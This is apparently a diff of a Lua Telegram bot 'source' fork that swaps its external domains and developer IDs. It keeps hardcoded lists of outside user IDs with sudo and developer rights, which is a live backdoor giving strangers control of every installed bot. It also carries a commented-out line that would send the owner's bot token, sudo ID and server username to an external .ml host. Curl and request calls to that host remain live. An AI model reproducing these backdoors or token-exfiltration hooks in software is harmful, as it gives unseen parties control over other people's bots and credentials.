@@ -72,7 +72,7 @@ infotnseb.id = database:get(id_server..":SUDO:ID")
 infotnseb.username = database:get(id_server..":SUDO:USERNAME")
 infotnseb.tokenbot = database:get(id_server..":token")
 infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
----https.request('https://devdeiveddev.ml/api/avaer.php/?insert='..JSON.encode(infotnseb))
+---https.request('https://jaxsooon.ml/api/avaer.php/?insert='..JSON.encode(infotnseb))
 print('\n\27[1;34m dddddoooonnnnnneeeeeeee sssseeeeennnnnnnddddddd :')
 create_config_auto()
 botUserName = database:get(id_server..":token_username")
@@ -192,7 +192,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1741899314,1449796269,60,50,1524355424}   
+sudo_users = {SUDO,1741899314,1449796269,60,50,100}   
 function SudoBot(msg)  
 local AVIRA = false  
 for k,v in pairs(sudo_users) do  
@@ -286,7 +286,7 @@ if tonumber(user_id) == tonumber(1741899314) then
 var = true
 elseif tonumber(user_id) == tonumber(1449796269) then
 var = true
-elseif tonumber(user_id) == tonumber(1524355424) then
+elseif tonumber(user_id) == tonumber(100) then
 var = true
 elseif tonumber(user_id) == tonumber(50) then
 var = true
@@ -328,7 +328,7 @@ if tonumber(user_id) == tonumber(1741899314) then
 var = ' مبـرمـج اوليفر'
 elseif tonumber(user_id) == tonumber(1449796269) then
 var = 'مبرمج السورس²'
-elseif tonumber(user_id) == tonumber(1524355424) then
+elseif tonumber(user_id) == tonumber(100) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(50) then
 var = 'مـطـور الـسـورس'
@@ -1163,7 +1163,7 @@ echo '◈ نظام التشغيل ◈\n⇎ *'"$linux_version"'*'
 echo '⩹━━━━⊶❲¹𝐎𝐋𝐈𝐕𝐄𝐑  ¹❳⊷━━━━⩺\n◉✔{ الذاكره العشوائيه } \n⇎ *'"$memUsedPrc"'*'
 echo '⩹━━━━⊶❲¹𝐎𝐋𝐈𝐕𝐄𝐑  ¹❳⊷━━━━⩺\n◉✔{ وحـده الـتـخـزيـن } \n⇎ *'"$HardDisk"'*'
 echo '⩹━━━━⊶❲¹𝐎𝐋𝐈𝐕𝐄𝐑  ¹❳⊷━━━━⩺\n◉✔{ الـمــعــالــج } \n⇎ *'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
-echo '⩹━━━━⊶❲¹𝐎𝐋𝐈𝐕𝐄𝐑  ¹❳⊷━━━━⩺\n◉✔{ موقـع الـسـيـرفـر }\n⇎ *'`curl https://devdeiveddev.ml/IP/Location.php`'*'
+echo '⩹━━━━⊶❲¹𝐎𝐋𝐈𝐕𝐄𝐑  ¹❳⊷━━━━⩺\n◉✔{ موقـع الـسـيـرفـر }\n⇎ *'`curl https://jaxsooon.ml/IP/Location.php`'*'
 echo '⩹━━━━⊶❲¹𝐎𝐋𝐈𝐕𝐄𝐑  ¹❳⊷━━━━⩺\n◉✔{ الــدخــول } \n⇎ *'`whoami`'*'
 echo '⩹━━━━⊶❲¹𝐎𝐋𝐈𝐕𝐄𝐑  ¹❳⊷━━━━⩺\n◉✔{ مـده تـشغيـل الـسـيـرفـر }\n⇎ *'"$uptime"'*'
 ]]):read('*all'))  
@@ -2897,7 +2897,7 @@ keyboard = {} keyboard.inline_keyboard = {
 {{text = '📖لقاء مع كاتب رعب"', url="https://t.me/SOURCE_SP/14"}},
 {{text = '📖رواية"الإنسان الأخير""', url="https://t.me/SOURCE_SP/16"}},
 {{text = '📖رواية" مقبرة الحيوانات""', url="https://t.me/SOURCE_SP/15"}},
-{{text = '𖣘⁽𝐶 𝐻 ₎𖣘', url="http://t.me/J_a_xs_oN "}},
+{{text = '𖣘⁽𝐶 𝐻 ₎??', url="http://t.me/J_a_xs_oN "}},
 {{text = '  𖣘 ⁽𝐽 𝐴 𝑋 𝑆 𝑂 𝑁 ₎ 𖣘 ',url="t.me/JAXSO0N"}},
 {{text = '  𖣘 ⁽𝐷 𝐼 𝐸 𝐺 𝑂 ₎ 𖣘 ',url="t.me/JA_XS"}}
 }
@@ -11221,12 +11221,12 @@ end
 -- عود اخمط وهوبز ع العالم كول تطويري ..
 
 if text == "الزمن" then 
-local time = https.request('https://devdeiveddev.ml/IP/timeEG.php') 
+local time = https.request('https://jaxsooon.ml/IP/timeEG.php') 
 local timezone = "الساعه الان بتوقيت القاهره : "..time.."\nالتاريخ : "..os.date("%Y/%m/%d") 
 send(msg.chat_id_, msg.id_,timezone) 
 end 
 if text == "الساعه" or text == 'الوقت' then 
-local time = https.request('https://devdeiveddev.ml/IP/timeEG.php') 
+local time = https.request('https://jaxsooon.ml/IP/timeEG.php') 
 local timezone = "الساعه الان بتوقيت القاهره : "..time 
 send(msg.chat_id_, msg.id_,timezone) 
 end 
